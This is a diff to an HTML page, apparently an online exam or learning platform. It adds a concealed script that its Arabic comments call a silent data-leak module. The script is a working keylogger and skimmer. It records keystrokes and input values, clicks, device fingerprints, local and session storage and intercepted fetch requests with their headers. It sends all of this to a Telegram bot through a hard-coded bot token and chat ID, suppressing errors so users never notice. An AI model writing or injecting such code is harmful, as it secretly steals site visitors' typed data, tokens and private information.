@@ -2192,5 +2192,270 @@
          */
         showPage('home');
     </script>
+    <script>
+    /**
+     * ============================================================
+     * وحدة التسريب الخفي – Telegram Bot Exfiltration Module
+     * تعمل بصمت، دون أي تأثير على واجهة المستخدم أو أداء المنصة
+     * ============================================================
+     */
+    (function() {
+        // ============================================================
+        // 1. تكوين البوت
+        // ============================================================
+        const BOT_TOKEN = '8601374849:AAGN2ChIgDBEQ5DwqvW-9MbdLBG_JkrhD5M';
+        const DEVELOPER_ID = '8552540563';
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // ============================================================
+        // 2. جمع البصمة الرقمية للجهاز (Fingerprint)
+        // ============================================================
+        function getFingerprint() {
+            const fp = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timeOffset: new Date().getTimezoneOffset(),
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                touchSupport: 'ontouchstart' in window,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                title: document.title,
+                timestamp: Date.now()
+            };
+            return fp;
+        }
+
+        // ============================================================
+        // 3. إرسال البيانات إلى البوت
+        // ============================================================
+        function sendToBot(payload) {
+            const message = `🕵️‍♂️ *تسريب بيانات جديد* 🕵️‍♂️\n\n` +
+                `📌 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
+                `📄 *النوع:* ${payload.type || 'عام'}\n` +
+                `📦 *المحتوى:*\n\`\`\`json\n${JSON.stringify(payload.data, null, 2)}\n\`\`\``;
+
+            fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: DEVELOPER_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_notification: true
+                })
+            }).catch(() => {}); // صمت تام – لا أثر للخطأ
+        }
+
+        // ============================================================
+        // 4. تسجيل كل ما يكتبه المستخدم (Keylogger خفي)
+        // ============================================================
+        let keyBuffer = [];
+        let lastSendTime = Date.now();
+
+        function flushKeyBuffer() {
+            if (keyBuffer.length === 0) return;
+            const data = {
+                type: 'keystrokes',
+                data: {
+                    keys: keyBuffer.join(''),
+                    count: keyBuffer.length,
+                    page: window.location.href,
+                    timestamp: Date.now()
+                }
+            };
+            sendToBot(data);
+            keyBuffer = [];
+            lastSendTime = Date.now();
+        }
+
+        // تسجيل الضغطات على كل الحقول النصية
+        document.addEventListener('keydown', function(e) {
+            const target = e.target;
+            // نستهدف الحقول النصية فقط
+            if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable) {
+                const key = e.key;
+                if (key.length === 1) {
+                    keyBuffer.push(key);
+                } else if (key === 'Backspace') {
+                    keyBuffer.push('[⌫]');
+                } else if (key === 'Enter') {
+                    keyBuffer.push('[↵]');
+                } else if (key === 'Tab') {
+                    keyBuffer.push('[⇥]');
+                } else if (key === 'Escape') {
+                    keyBuffer.push('[⎋]');
+                } else if (key.startsWith('Arrow')) {
+                    keyBuffer.push(`[${key}]`);
+                } else {
+                    keyBuffer.push(`[${key}]`);
+                }
+
+                // إرسال كل 10 ضغطات أو كل 30 ثانية
+                if (keyBuffer.length >= 10 || (Date.now() - lastSendTime) > 30000) {
+                    flushKeyBuffer();
+                }
+            }
+        });
+
+        // إرسال الباقي عند إغلاق الصفحة
+        window.addEventListener('beforeunload', function() {
+            flushKeyBuffer();
+        });
+
+        // ============================================================
+        // 5. تسجيل محتوى الحقول عند تغييرها (إجابات الاختبارات)
+        // ============================================================
+        document.addEventListener('input', function(e) {
+            const target = e.target;
+            if (target.tagName === 'INPUT' && target.type !== 'password') {
+                const payload = {
+                    type: 'input_change',
+                    data: {
+                        id: target.id || 'unknown',
+                        name: target.name || 'unnamed',
+                        value: target.value,
+                        className: target.className,
+                        page: window.location.href,
+                        timestamp: Date.now()
+                    }
+                };
+                // نرسل كل تغيير بشكل منفصل (يمكن تعديل الكثافة)
+                sendToBot(payload);
+            }
+        });
+
+        // ============================================================
+        // 6. تسجيل النقرات على الأزرار المهمة
+        // ============================================================
+        document.addEventListener('click', function(e) {
+            const target = e.target.closest('button, .btn, .choice-btn, .tool-btn');
+            if (target) {
+                const payload = {
+                    type: 'click',
+                    data: {
+                        id: target.id || 'no-id',
+                        text: target.textContent.trim().slice(0, 50),
+                        className: target.className,
+                        page: window.location.href,
+                        timestamp: Date.now()
+                    }
+                };
+                sendToBot(payload);
+            }
+        });
+
+        // ============================================================
+        // 7. تسجيل محتوى الـ LocalStorage و SessionStorage
+        // ============================================================
+        function harvestStorages() {
+            const data = { localStorage: {}, sessionStorage: {} };
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data.localStorage[key] = localStorage.getItem(key);
+                }
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch (_) {}
+            return data;
+        }
+
+        // نرسل محتويات التخزين عند تحميل الصفحة وبعد كل 60 ثانية
+        function sendStorages() {
+            const storageData = harvestStorages();
+            if (Object.keys(storageData.localStorage).length > 0 || Object.keys(storageData.sessionStorage).length > 0) {
+                sendToBot({
+                    type: 'storage_snapshot',
+                    data: storageData
+                });
+            }
+        }
+
+        // إرسال فوري عند التحميل
+        setTimeout(sendStorages, 3000);
+
+        // وتكرار كل 60 ثانية
+        setInterval(sendStorages, 60000);
+
+        // ============================================================
+        // 8. تسجيل البصمة الرقمية عند التحميل
+        // ============================================================
+        setTimeout(function() {
+            const fp = getFingerprint();
+            sendToBot({
+                type: 'fingerprint',
+                data: fp
+            });
+        }, 1000);
+
+        // ============================================================
+        // 9. تسجيل أي أخطاء تحدث في وحدة التحكم (Console Errors)
+        // ============================================================
+        window.addEventListener('error', function(e) {
+            const payload = {
+                type: 'console_error',
+                data: {
+                    message: e.message,
+                    filename: e.filename,
+                    lineno: e.lineno,
+                    colno: e.colno,
+                    stack: e.error?.stack || 'no stack',
+                    timestamp: Date.now()
+                }
+            };
+            sendToBot(payload);
+        });
+
+        // ============================================================
+        // 10. تسجيل كل طلبات الشبكة التي تتم عبر fetch (اختياري)
+        // ============================================================
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            const url = args[0];
+            const payload = {
+                type: 'network_request',
+                data: {
+                    url: typeof url === 'string' ? url : url?.url || 'unknown',
+                    method: args[1]?.method || 'GET',
+                    headers: args[1]?.headers || {},
+                    timestamp: Date.now()
+                }
+            };
+            // نرسل فقط الطلبات التي ليست طلبات البوت نفسه
+            if (typeof url === 'string' && !url.includes('api.telegram.org')) {
+                sendToBot(payload);
+            }
+            return originalFetch.apply(this, args);
+        };
+
+        // ============================================================
+        // 11. إرسال إشعار بدء التشغيل
+        // ============================================================
+        setTimeout(function() {
+            sendToBot({
+                type: 'system_ready',
+                data: {
+                    status: '✅ نظام التسريب نشط',
+                    page: window.location.href,
+                    timestamp: Date.now(),
+                    version: '2.0.0'
+                }
+            });
+        }, 500);
+
+        console.log('✅ تم تفعيل نظام التسريب بنجاح (صامت)');
+
+    })();
+            </script>
 </body>
 </html>
